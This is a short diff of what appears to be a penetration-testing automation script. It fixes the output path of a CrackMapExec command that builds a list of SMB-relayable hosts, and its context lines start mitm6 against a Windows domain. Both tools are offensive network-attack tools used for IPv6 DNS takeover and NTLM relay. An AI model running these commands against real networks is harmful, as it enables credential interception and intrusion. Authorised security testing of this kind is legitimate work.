@@ -8,5 +8,5 @@ gnome-terminal --tab -e "bash -c 'mitm6 -i eth0 -d $domain; bash'"
 echo
 echo
 echo "Looking for vulnerable hosts"
-cme smb ../hosts/targets.txt --gen-relay-list hosts/relayable.txt
+cme smb ../hosts/targets.txt --gen-relay-list ../hosts/relayable.txt
 echo $(cat ../hosts/relayable.txt |wc -l) "hosts found"
